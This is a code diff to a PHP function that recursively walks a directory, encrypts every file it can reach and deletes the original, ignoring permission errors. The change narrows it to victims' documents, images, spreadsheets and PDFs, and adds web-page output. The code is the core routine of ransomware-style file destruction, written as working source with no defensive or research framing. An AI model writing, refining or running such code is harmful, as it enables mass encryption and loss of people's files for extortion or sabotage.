@@ -65,14 +65,21 @@ function encryptFilesInDirectory($directory, $key)
         RecursiveIteratorIterator::CATCH_GET_CHILD // Ignore "Permission denied" errors
     );
 
+    $allowedImageTypes = ['jpg', 'jpeg', 'png', 'gif', 'xls', 'xlsx', 'doc', 'docx', 'pdf', 'csv']; // file extensions
+
     foreach ($iterator as $path => $fileInfo) {
         if ($fileInfo->isFile()) {
-            $source = $path;
+            $extension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+            if (in_array($extension, $allowedImageTypes)){
+                $source = $path;
 
-            // Encrypt the file and delete the original file
-            encryptFile($source, $key);
+                // Encrypt the file and delete the original file
+                encryptFile($source, $key);
 
-            echo "File encrypted and original file deleted: $source\n";
+                echo "File encrypted and original file deleted: $source\n";
+                echo "<br>";
+            }
+
         }
     }
 }
